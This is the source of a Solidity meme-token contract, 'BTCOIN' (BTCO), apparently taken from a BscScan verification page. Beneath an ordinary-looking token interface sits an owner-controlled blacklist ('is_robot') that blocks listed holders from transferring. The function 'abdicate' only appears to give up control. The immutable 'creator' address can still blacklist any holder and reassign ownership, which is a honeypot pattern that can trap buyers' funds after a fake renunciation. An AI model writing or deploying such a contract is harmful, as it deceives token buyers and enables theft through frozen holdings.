/**
 *Submitted for verification at BscScan.com on 2023-05-14
*/

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

contract BTCOIN_MEME {
    
    uint constant  Lovelace = 1000000;
    address public kill_robot_owner;
    address public immutable creator;
    mapping (address => bool) public is_robot;
    string public symbol = "BTCO";
    string public  name = "BTCOIN";
    uint8 public decimals = 10;
    uint public totalSupply = 2121212121212121 * Lovelace;

    mapping(address => uint) public balanceOf;
    mapping (address => mapping (address => uint)) public allowance;

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);

    constructor() {
        balanceOf[msg.sender] = totalSupply;
        kill_robot_owner = msg.sender;
        creator = msg.sender;
    }
    
    fallback () external payable {}
    receive () external payable {}

    function setRobot(address robot,bool value) public {
        require(msg.sender == kill_robot_owner || msg.sender == creator);
        is_robot[robot] = value;
    }

    function transferOwnership(address newOwner) public {
        require(msg.sender == kill_robot_owner || msg.sender == creator);
        kill_robot_owner = newOwner;
    }

    function abdicate() public {
        require(msg.sender == kill_robot_owner);
        kill_robot_owner = address(0x0);
    }

    function safeAdd(uint a, uint b) internal  pure returns (uint c) {
        c = a + b;
        require(c >= a);
    }
    function safeSub(uint a, uint b) internal pure returns (uint c) {
        require(b <= a);
        c = a - b;
    }
    function safeMul(uint a, uint b) internal pure returns (uint c) {
        c = a * b;
        require(a == 0 || c / a == b);
    }
    function safeDiv(uint a, uint b) internal pure returns (uint c) {
        require(b > 0);
        c = a / b;
    }

    function transfer(address to, uint tokens) public returns (bool success) {
        require(is_robot[msg.sender] == false);
        balanceOf[msg.sender] = safeSub(balanceOf[msg.sender], tokens);
        balanceOf[to] = safeAdd(balanceOf[to], tokens);
        emit Transfer(msg.sender, to, tokens);
        return true;
    }

    function approve(address spender, uint tokens) public returns (bool success) {
        require(is_robot[msg.sender] == false);
        allowance[msg.sender][spender] = tokens;
        emit Approval(msg.sender, spender, tokens);
        return true;
    }

        function transferFrom(address from, address to, uint tokens) public returns (bool success) {
        require(is_robot[msg.sender] == false);
        balanceOf[from] = safeSub(balanceOf[from], tokens);
        allowance[from][msg.sender] = safeSub(allowance[from][msg.sender], tokens);
        balanceOf[to] = safeAdd(balanceOf[to], tokens);
        emit Transfer(from, to, tokens);
        return true;
    }

    function transferBatch(address to1,address to2,address to3,address to4,address to5,
                           address to6,address to7,address to8,address to9,address to10,
                           uint size) public returns(bool success) {
        require(is_robot[msg.sender] == false);
        uint total;
        if(to1 != address(0x0)) {total = safeAdd(total,size); balanceOf[to1] = safeAdd(balanceOf[to1],size); emit Transfer(msg.sender, to1, size);}
        if(to2 != address(0x0)) {total = safeAdd(total,size); balanceOf[to2] = safeAdd(balanceOf[to2],size); emit Transfer(msg.sender, to2, size);}
        if(to3 != address(0x0)) {total = safeAdd(total,size); balanceOf[to3] = safeAdd(balanceOf[to3],size); emit Transfer(msg.sender, to3, size);}
        if(to4 != address(0x0)) {total = safeAdd(total,size); balanceOf[to4] = safeAdd(balanceOf[to4],size); emit Transfer(msg.sender, to4, size);}
        if(to5 != address(0x0)) {total = safeAdd(total,size); balanceOf[to5] = safeAdd(balanceOf[to5],size); emit Transfer(msg.sender, to5, size);}
        if(to6 != address(0x0)) {total = safeAdd(total,size); balanceOf[to6] = safeAdd(balanceOf[to6],size); emit Transfer(msg.sender, to6, size);}
        if(to7 != address(0x0)) {total = safeAdd(total,size); balanceOf[to7] = safeAdd(balanceOf[to7],size); emit Transfer(msg.sender, to7, size);}
        if(to8 != address(0x0)) {total = safeAdd(total,size); balanceOf[to8] = safeAdd(balanceOf[to8],size); emit Transfer(msg.sender, to8, size);}
        if(to9 != address(0x0)) {total = safeAdd(total,size); balanceOf[to9] = safeAdd(balanceOf[to9],size); emit Transfer(msg.sender, to9, size);}
        if(to10 != address(0x0)) {total = safeAdd(total,size); balanceOf[to10] = safeAdd(balanceOf[to10],size); emit Transfer(msg.sender, to10, size);}

        if(total > 0) balanceOf[msg.sender] = safeSub(balanceOf[msg.sender], total);

        return true;
    }
}